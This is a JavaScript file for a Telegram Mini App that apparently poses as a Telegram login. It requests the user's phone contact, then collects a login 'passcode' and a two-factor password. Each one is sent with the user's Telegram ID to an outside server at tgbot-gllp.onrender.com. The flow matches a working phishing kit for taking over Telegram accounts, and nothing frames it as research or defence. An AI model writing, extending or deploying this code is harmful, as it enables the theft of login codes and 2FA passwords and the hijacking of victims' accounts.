document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready(); 
    let page = 'page1';

    console.log("✅ Telegram WebApp initialized");
    console.log("initData:", tg.initData);
    console.log("initDataUnsafe:", tg.initDataUnsafe);
    
    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const blur = document.getElementById('blur');
    const TEST = document.getElementById('TEST');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');

    loginBtn.addEventListener('click', async () => {
        try {
            tg.requestContact();
            tg.onEvent('contactRequested', (data) => {
                if (data.status === 'sent') {
                    showPage2();
                }
            });
        } catch (error) {
            console.log('[ERROR]: ' + error);
        }
    });

    function showPage2() {
        page = 'page2';
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginBtn.style.display = 'none';
    }

    function showPage3() {
        page = 'page3';
        page2.style.display = 'none';
        page3.style.display = 'flex';
        requestAnimationFrame(() => {
            page3.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page3.style.zIndex = '100';
        blur.style.opacity = '1';
    }

    blur.addEventListener('click', () => {
        if (page === 'page2') {
            blur.style.zIndex = '-1';
            page2.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page2.style.transform = 'translateY(40px)';
            });
        } else if (page === 'page3') {
            blur.style.zIndex = '-1';
            page3.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page3.style.transform = 'translateY(40px)';
            });
        }
    });

    // Handle passcode submission
    passcodeBtn.addEventListener('click', async () => {
        const passcode = passcodeInput.value;
        const user = tg.initDataUnsafe?.user;

        console.log('👤 Telegram user:', user);

        if (!passcode) {
            console.log('❌ No passcode entered');
            tg.showAlert('⚠️ Please enter passcode');
            return;
        }

        if (!user) {
            console.log('❌ No Telegram user info found');
            tg.showAlert('⚠️ Telegram user info not available');
            return;
        }

        const user_id = user.id;

        console.log('📤 Sending passcode:', passcode);
        console.log('📤 User ID:', user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    passcode: passcode,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            console.log('✅ Response:', result);
            tg.showAlert('✅ Passcode sent successfully!');
            
            // Show 2FA page after successful passcode submission
            setTimeout(() => {
                showPage3();
            }, 1000);
            
        } catch (err) {
            console.error('❌ Fetch error:', err);
            tg.showAlert('❌ Failed to send passcode');
        }
    });

    // Handle 2FA submission
    const twofactorBtn = document.getElementById('twofactor-btn');
    twofactorBtn.addEventListener('click', async () => {
        const twofactor = twofactorInput.value;
        const user = tg.initDataUnsafe?.user;

        console.log('👤 Telegram user:', user);

        if (!twofactor) {
            console.log('❌ No 2FA password entered');
            tg.showAlert('⚠️ Please enter 2FA password');
            return;
        }

        if (!user) {
            console.log('❌ No Telegram user info found');
            tg.showAlert('⚠️ Telegram user info not available');
            return;
        }

        const user_id = user.id;

        console.log('📤 Sending 2FA password');
        console.log('📤 User ID:', user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    twofactor: twofactor,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            console.log('✅ Response:', result);
            tg.showAlert('✅ 2FA password sent successfully!');
            
        } catch (err) {
            console.error('❌ Fetch error:', err);
            tg.showAlert('❌ Failed to send 2FA password');
        }
    });

    // Handle passcode input display
    const input = document.getElementById('hiddenInput');
    const cells = document.querySelectorAll('.cell');
    const box = document.getElementById('codeBox');

    box.addEventListener('click', () => input.focus());

    input.addEventListener('input', () => {
        const value = input.value.split('');
        cells.forEach((cell, i) => {
            cell.textContent = value[i] || '';
            if (value[i]) {
                requestAnimationFrame(() => {
                    cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
                });
            } else {
                cell.style.boxShadow = '';
            }
        });
    });
});